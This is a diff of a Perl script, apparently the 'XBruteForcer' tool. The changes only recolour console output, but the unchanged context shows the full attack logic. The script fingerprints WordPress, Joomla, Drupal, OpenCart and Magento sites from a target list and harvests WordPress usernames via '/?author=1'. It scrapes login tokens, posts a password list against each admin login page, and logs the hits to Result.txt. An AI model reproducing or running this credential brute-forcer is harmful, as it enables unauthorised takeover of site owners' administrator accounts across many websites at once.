@@ -56,6 +56,7 @@ OPTIONS:
    -p  => Passwords list
 );
 }
+
 sub XBruteForcer {
 print color('bold red'),"[";
 print color('bold green'),"1";
@@ -89,7 +90,7 @@ print color('bold white')," Choose Number : ";
 
 my $number = <STDIN>;
 chomp $number;
-
+print "\n";
 if($number eq '1')
 {
     open (THETARGET, "<$list") || die "[-] Can't open the file";
@@ -100,7 +101,10 @@ $link=$#TARGETS + 1;
 OUTER: foreach $site(@TARGETS){
 chomp($site);
 
-print "\n[*] URL: $site\n";
+print color('bold red'),"\n[";
+print color('bold green'),"+";
+print color('bold red'),"] ";
+print color('bold white'),"$site";
 wpuser();
 }
 }
@@ -116,7 +120,10 @@ $link=$#TARGETS + 1;
 OUTER: foreach $site(@TARGETS){
 chomp($site);
 
-print "\n[*] URL: $site\n";
+print color('bold red'),"\n[";
+print color('bold green'),"+";
+print color('bold red'),"] ";
+print color('bold white'),"$site";
 joomla();
 }
 }
@@ -132,7 +139,10 @@ $link=$#TARGETS + 1;
 OUTER: foreach $site(@TARGETS){
 chomp($site);
 
-print "\n[*] URL: $site\n";
+print color('bold red'),"\n[";
+print color('bold green'),"+";
+print color('bold red'),"] ";
+print color('bold white'),"$site";
 drupal();
 }
 }
@@ -148,7 +158,10 @@ $link=$#TARGETS + 1;
 OUTER: foreach $site(@TARGETS){
 chomp($site);
 
-print "\n\n[*] URL: $site\n";
+print color('bold red'),"\n[";
+print color('bold green'),"+";
+print color('bold red'),"] ";
+print color('bold white'),"$site";
 opencart();
 }
 }
@@ -164,7 +177,10 @@ $link=$#TARGETS + 1;
 OUTER: foreach $site(@TARGETS){
 chomp($site);
 
-print "\n\n[*] URL: $site\n";
+print color('bold red'),"\n[";
+print color('bold green'),"+";
+print color('bold red'),"] ";
+print color('bold white'),"$site";
 magento();
 }
 }
@@ -179,7 +195,10 @@ $link=$#TARGETS + 1;
 OUTER: foreach $site(@TARGETS){
 chomp($site);
 
-print "\n\n[*] URL: $site";
+print color('bold red'),"\n[";
+print color('bold green'),"+";
+print color('bold red'),"] ";
+print color('bold white'),"$site";
 cms();
 }
 }
@@ -191,30 +210,35 @@ $magsite = $site . '/admin';
 my $magcms = $ua->get("$magsite")->content;
 my $cms = $ua->get("$site")->content;
 if($cms =~/wp-content|wordpress/) {
-   print color("bold white"), " - WordPress\n\n";
+print color('bold white')," - "; 
+print color("bold green"), "WordPress\n";
 wpuser();
 }
 
 elsif($cms =~/<script type=\"text\/javascript\" src=\"\/media\/system\/js\/mootools.js\"><\/script>| \/media\/system\/js\/|com_content|Joomla!/) {
-   print color("bold white"), " - Joomla\n\n"; 
+print color('bold white')," - "; 
+print color("bold green"), "Joomla\n"; 
 joomla();
 }
 elsif($cms =~/Drupal|drupal|sites\/all|drupal.org/) {
-   print color("bold white"), " - Drupal\n\n";
+print color('bold white')," - "; 
+print color("bold green"), "Drupal\n";
 drupal();
 }
 
 elsif($cms =~/route=product|OpenCart|route=common|catalog\/view\/theme/) {
-   print color("bold white"), " - OpenCart\n\n";
+print color('bold white')," - "; 
+print color("bold green"), "OpenCart\n";
 opencart();
 }
 
 elsif($magcms =~/Log into Magento Admin Page|name=\"dummy\" id=\"dummy\"|Magento/) {
-   print color("bold white"), " - Magento\n\n";
+   print color("bold green"), " - Magento\n";
 magento();
 }
 else{
-print color("bold white"), " - Unknown\n\n";
+print color('bold white')," - ";  
+print color("bold red"), "Unknown\n";
 }
 }
 
@@ -227,24 +251,36 @@ $user = $site . '/?author=1';
 $getuser = $ua->get($user)->content;
 if($getuser =~/author\/(.*?)\//){
 $wpuser=$1;
-print "[+] Username: $wpuser\n";
+print color('bold red'),"\n[";
+print color('bold green'),"+";
+print color('bold red'),"] ";
+print color('bold white'),"Username: $wpuser\n";
 wp();
 }
 else {
-print "Can't Get Username\n\n";
+print color('bold red'),"\n[";
+print color('bold green'),"+";
+print color('bold red'),"] ";
+print color('bold white'),"Can't Get Username\n\n";
 }
 }
 
 ###### WorDPress #######
 sub wp{
-print"[-] Starting brute force\n";
+print color('bold red'),"\n[";
+print color('bold green'),"-";
+print color('bold red'),"] ";
+print color('bold white'),"Starting brute force\n";
 open(a,"<$pass") or die "$!";
 while(<a>){
 chomp($_);
 $wp = $site . '/wp-login.php';
 $redirect = $site . '/wp-admin/';
 $wpass = $_;
-print "[-] Trying: $wpass ";
+print color('bold red'),"[";
+print color('bold green'),"+";
+print color('bold red'),"] ";
+print color('bold white'),"Trying: $wpass \n";
 $wpbrute = POST $wp, [log => $wpuser, pwd => $wpass, wp-submit => 'Log In', redirect_to => $redirect];
 $response = $ua->request($wpbrute);
 my $stat = $response->as_string;
@@ -252,7 +288,7 @@ my $stat = $response->as_string;
 if($stat =~ /Location:/){
 if($stat =~ /wordpress_logged_in/){
 
-print "- ";
+print color('bold white'),"- ";
 print color('bold green'),"FOUND\n";
 print color('reset');
 
@@ -283,23 +319,32 @@ $getoken = $ua->get($joomsite)->content;
 if ( $getoken =~ /name="(.*)" value="1"/ ) {
 $token = $1 ;
 }else{
-print "[-] Can't Grabb Joomla Token !\n";
+print color('bold red'),"\n[";
+print color('bold green'),"x";
+print color('bold red'),"] ";
+print color('bold white'),"Can't Grabb Joomla Token !\n";
 next OUTER;
 }
 
-print"[-] Starting brute force";
+print color('bold red'),"\n[";
+print color('bold green'),"-";
+print color('bold red'),"] ";
+print color('bold white'),"Starting brute force\n";
 open(a,"<$pass") or die "$!";
 while(<a>){
 chomp($_);
 $joomuser = admin;
 $joompass = $_;
-print "\n[-] Trying: $joompass ";
+print color('bold red'),"[";
+print color('bold green'),"+";
+print color('bold red'),"] ";
+print color('bold white'),"Trying: $joompass \n";
 $joomlabrute = POST $joomsite, [username => $joomuser, passwd => $joompass, lang =>en-GB, option => user_login, task => login, $token => 1];
 $response = $ua->request($joomlabrute);
 
 my $check = $ua->get("$joomsite")->content;
 if ($check =~ /logout/){
-print "- ";
+print color('bold white'),"- ";
 print color('bold green'),"FOUND\n";
 print color('reset');
 
@@ -313,13 +358,19 @@ next OUTER;
 
 ######DruPal#######
 sub drupal{
-print"[-] Starting brute force";
+print color('bold red'),"\n[";
+print color('bold green'),"-";
+print color('bold red'),"] ";
+print color('bold white'),"Starting brute force\n";
 open(a,"<$pass") or die "$!";
 while(<a>){
 chomp($_);
 $druser = admin;
 $drupass = $_;
-print "\n[-] Trying: $drupass ";
+print color('bold red'),"[";
+print color('bold green'),"+";
+print color('bold red'),"] ";
+print color('bold white'),"Trying: $drupass \n";
 
 $drupal = $site . '/user/login';
 $redirect = $site . '/user/1';
@@ -328,7 +379,7 @@ $drupalbrute = POST $drupal, [name => $druser, pass => $drupass, form_build_id =
 $response = $ua->request($drupalbrute);
 $stat = $response->status_line;
     if ($stat =~ /302/){
-print "- ";
+print color('bold white'),"- ";
 print color('bold green'),"FOUND\n";
 print color('reset');
 
@@ -342,20 +393,26 @@ next OUTER;
 
 ###### OpenCart #######
 sub opencart{
-print"[-] Starting brute force";
+print color('bold red'),"\n[";
+print color('bold green'),"-";
+print color('bold red'),"] ";
+print color('bold white'),"Starting brute force\n";
 open(a,"<$pass") or die "$!";
 while(<a>){
 chomp($_);
 $ocuser = admin;
 $ocpass = $_;
-print "\n[-] Trying: $ocpass ";
+print color('bold red'),"[";
+print color('bold green'),"+";
+print color('bold red'),"] ";
+print color('bold white'),"Trying: $ocpass \n";
 $OpenCart= $site . '/admin/index.php';
 
 $ocbrute = POST $OpenCart, [username => $ocuser, password => $ocpass,];
 $response = $ua->request($ocbrute);
 $stat = $response->status_line;
 if ($stat =~ /302/){
-print "- ";
+print color('bold white'),"- ";
 print color('bold green'),"FOUND\n";
 print color('reset');
 open (TEXT, '>>Result.txt');
@@ -384,23 +441,32 @@ $getoken = $ua->get($magsite)->content;
 if ( $getoken =~ /type="hidden" value="(.*)"/ ) {
 $token = $1 ;
 }else{
-print "[-] Can't Grabb Magento Token !\n";
+print color('bold red'),"\n[";
+print color('bold green'),"x";
+print color('bold red'),"] ";
+print color('bold white'),"Can't Grabb Magento Token !\n";
 next OUTER;
 }
 
-print"[-] Starting brute force";
+print color('bold red'),"\n[";
+print color('bold green'),"-";
+print color('bold red'),"] ";
+print color('bold white'),"Starting brute force\n";
 open(a,"<$pass") or die "$!";
 while(<a>){
 chomp($_);
 $maguser = "admin";
 $magpass = $_;
-print "\n[-] Trying: $magpass ";
+print color('bold red'),"[";
+print color('bold green'),"+";
+print color('bold red'),"] ";
+print color('bold white'),"Trying: $magpass \n";
 
 $magbrute = POST $magsite, ["form_key" => "$token", "login[username]" => "$maguser", "dummy" => "", "login[password]" => "$magpass"];
 $response = $ua->request($magbrute);
 my $pwnd = $ua->get("$magsite")->content;
 if ($pwnd =~ /logout/){
-print "- ";
+print color('bold white'),"- ";
 print color('bold green'),"FOUND\n";
 print color('reset');
 open (TEXT, '>>Result.txt');
